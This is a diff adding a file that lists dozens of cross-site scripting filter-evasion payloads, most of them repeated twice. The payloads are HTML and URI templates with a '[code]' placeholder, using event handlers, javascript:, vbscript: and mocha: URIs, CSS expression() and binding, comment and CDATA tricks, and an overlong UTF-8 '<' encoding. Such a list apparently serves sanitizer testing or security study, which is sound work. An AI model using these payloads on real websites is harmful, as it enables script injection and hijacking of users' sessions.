@@ -1,0 +1,64 @@
+<a href="javas&#99;ript&#35;[code]">
+<a href="javas&#99;ript&#35;[code]">
+<div onmouseover="[code]">
+<img src="javascript:[code]">
+<img dynsrc="javascript:[code]">
+<input type="image" dynsrc="javascript:[code]">
+<bgsound src="javascript:[code]">
+&<script>[code]</script>
+&{[code]};
+<img src=&{[code]};>
+<link rel="stylesheet" href="javascript:[code]">
+<iframe src="vbscript:[code]">
+<img src="mocha:[code]">
+<img src="livescript:[code]">
+<a href="about:<s&#99;ript>[code]</script>">
+<meta http-equiv="refresh" content="0;url=javascript:[code]">
+<body onload="[code]">
+<div style="background-image: url(javascript:[code]);">
+<div style="behaviour: url([link to code]);">
+<div style="binding: url([link to code]);">
+<div style="width: expression([code]);">
+<style type="text/javascript">[code]</style>
+<object classid="clsid:..." codebase="javascript:[code]">
+<style><!--</style><script>[code]//--></script>
+<![CDATA[<!--]]><script>[code]//--></script>
+<!-- -- --><script>[code]</script><!-- -- -->
+<<script>[code]</script>
+<img src="blah"onmouseover="[code]">
+<img src="blah>" onmouseover="[code]">
+<xml src="javascript:[code]">
+<xml id="X"><a><b>&lt;script>[code]&lt;/script>;</b></a></xml>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<a href="javas&#99;ript&#35;[code]">
+<div onmouseover="[code]">
+<img src="javascript:[code]">
+<img dynsrc="javascript:[code]">
+<input type="image" dynsrc="javascript:[code]">
+<bgsound src="javascript:[code]">
+&<script>[code]</script>
+&{[code]};
+<img src=&{[code]};>
+<link rel="stylesheet" href="javascript:[code]">
+<iframe src="vbscript:[code]">
+<img src="mocha:[code]">
+<img src="livescript:[code]">
+<a href="about:<s&#99;ript>[code]</script>">
+<meta http-equiv="refresh" content="0;url=javascript:[code]">
+<body onload="[code]">
+<div style="background-image: url(javascript:[code]);">
+<div style="behaviour: url([link to code]);">
+<div style="binding: url([link to code]);"> [Mozilla]
+<div style="width: expression([code]);">
+<style type="text/javascript">[code]</style>
+<object classid="clsid:..." codebase="javascript:[code]">
+<style><!--</style><script>[code]//--></script>
+<![CDATA[<!--]]><script>[code]//--></script>
+<!-- -- --><script>[code]</script><!-- -- -->
+<<script>[code]</script>
+<img src="blah"onmouseover="[code]">
+<img src="blah>" onmouseover="[code]">
+<xml src="javascript:[code]">
+<xml id="X"><a><b>&lt;script>[code]&lt;/script>;</b></a></xml>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+[\xC0][\xBC]script>[code][\xC0][\xBC]/script> 
